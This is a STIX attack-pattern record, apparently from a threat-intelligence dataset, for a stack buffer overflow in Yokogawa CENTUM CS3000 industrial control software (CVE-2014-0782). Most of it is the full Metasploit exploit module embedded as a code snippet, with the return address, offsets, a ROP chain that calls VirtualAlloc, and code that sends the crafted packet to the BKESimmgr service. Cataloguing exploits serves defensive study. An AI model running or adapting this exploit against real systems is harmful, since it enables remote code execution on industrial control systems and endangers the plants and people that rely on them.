{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b13604b8-63d4-4820-8630-86a976bac677",
    "created": "2024-08-14T16:39:14.501035Z",
    "modified": "2024-08-14T16:39:14.501039Z",
    "name": "Yokogawa CS3000 BKESimmgr.exe Buffer Overflow",
    "description": " This module exploits an stack based buffer overflow on Yokogawa CS3000. The vulnerability exists in the BKESimmgr.exe service when handling specially crafted packets, due to an insecure usage of memcpy, using attacker controlled data as the size count. This module has been tested successfully in Yokogawa CS3000 R3.08.50 over Windows XP SP3 and Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/yokogawa_bkesimmgr_bof.rb",
            "external_id": "yokogawa_bkesimmgr_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0782"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2014/05/09/r7-2013-192-disclosure-yokogawa-centum-cs-3000-vulnerabilities"
        },
        {
            "source_name": "reference",
            "url": "http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Yokogawa CS3000 BKESimmgr.exe Buffer Overflow',\n      'Description'    => %q{\n        This module exploits an stack based buffer overflow on Yokogawa CS3000. The vulnerability\n        exists in the BKESimmgr.exe service when handling specially crafted packets, due to an\n        insecure usage of memcpy, using attacker controlled data as the size count. This module\n        has been tested successfully in Yokogawa CS3000 R3.08.50 over Windows XP SP3 and Windows\n        2003 SP2.\n      },\n      'Author'         =>\n        [\n          'juan vazquez',\n          'Redsadic <julian.vilas[at]gmail.com>'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-0782'],\n          ['URL', 'https://www.rapid7.com/blog/post/2014/05/09/r7-2013-192-disclosure-yokogawa-centum-cs-3000-vulnerabilities'],\n          ['URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf']\n        ],\n      'Payload'        =>\n        {\n          'Space'          => 340,\n          'DisableNops'    => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Yokogawa Centum CS3000 R3.08.50 / Windows [ XP SP3 / 2003 SP2 ]',\n            {\n              'Ret'           => 0x61d1274f, # 0x61d1274f # ADD ESP,10 # RETN # libbkebatchepa.dll\n              'Offset'        => 64,\n              'FakeArgument1' => 0x0040E65C, # ptr to .data on BKESimmgr.exe\n              'FakeArgument2' => 0x0040EB90  # ptr to .data on BKESimmgr.exe\n            }\n          ],\n        ],\n      'DisclosureDate' => '2014-03-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(34205)\n      ])\n  end\n\n  def check\n    data = create_pkt(rand_text_alpha(4))\n\n    res = send_pkt(data)\n\n    if res && res.length == 10\n      simmgr_res = parse_response(res)\n\n      if valid_response?(simmgr_res)\n        check_code = Exploit::CheckCode::Appears\n      else\n        check_code = Exploit::CheckCode::Safe\n      end\n    else\n      check_code = Exploit::CheckCode::Safe\n    end\n\n    check_code\n  end\n\n  def exploit\n    bof = rand_text(target['Offset'])\n    bof << [target.ret].pack(\"V\")\n    bof << [target['FakeArgument1']].pack(\"V\")\n    bof << [target['FakeArgument2']].pack(\"V\")\n    bof << rand_text(16)  # padding (corrupted bytes)\n    bof << create_rop_chain\n    bof << payload.encoded\n\n    data = [0x1].pack(\"N\")         # Sub-operation id, <= 0x8 in order to pass the check at sub_4090B0\n    data << [bof.length].pack(\"n\")\n    data << bof\n\n    pkt = create_pkt(data)\n\n    print_status(\"Trying target #{target.name}, sending #{pkt.length} bytes...\")\n    connect\n    sock.put(pkt)\n    disconnect\n  end\n\n  def create_rop_chain\n    # rop chain generated with mona.py - www.corelan.be\n    rop_gadgets =\n      [\n        0x004047ca, # POP ECX # RETN [BKESimmgr.exe]\n        0x610e3024, # ptr to &VirtualAlloc() [IAT libbkfmtvrecinfo.dll]\n        0x61232d60, # MOV EAX,DWORD PTR DS:[ECX] # RETN [LibBKESysVWinList.dll]\n        0x61d19e6a, # XCHG EAX,ESI # RETN [libbkebatchepa.dll]\n        0x619436d3, # POP EBP # RETN [libbkeeda.dll]\n        0x61615424, # & push esp #  ret  [libbkeldc.dll]\n        0x61e56c8e, # POP EBX # RETN [LibBKCCommon.dll]\n        0x00000001, # 0x00000001-> ebx\n        0x61910021, # POP EDX # ADD AL,0 # MOV EAX,6191002A # RETN [libbkeeda.dll]\n        0x00001000, # 0x00001000-> edx\n        0x0040765a, # POP ECX # RETN [BKESimmgr.exe]\n        0x00000040, # 0x00000040-> ecx\n        0x6191aaab, # POP EDI # RETN [libbkeeda.dll]\n        0x61e58e04, # RETN (ROP NOP) [LibBKCCommon.dll]\n        0x00405ffa, # POP EAX # RETN [BKESimmgr.exe]\n        0x90909090, # nop\n        0x619532eb  # PUSHAD # RETN [libbkeeda.dll]\n      ].pack(\"V*\")\n\n    rop_gadgets\n  end\n\n  def create_pkt(data)\n    pkt = [0x01].pack(\"N\")         # Operation Identifier\n    pkt << [data.length].pack(\"n\") # length\n    pkt << data                    # Fake packet\n\n    pkt\n  end\n\n  def send_pkt(data)\n    connect\n    sock.put(data)\n    res = sock.get_once\n    disconnect\n\n    res\n  end\n\n  def parse_response(data)\n    data.unpack(\"NnN\")\n  end\n\n  def valid_response?(data)\n    valid = false\n\n    if data && data[0] == 1 && data[1] == 4 && data[1] == 4 && data[2] == 5\n      valid = true\n    end\n\n    valid\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-10",
    "x_mitre_platforms": [
        "win'"
    ]
}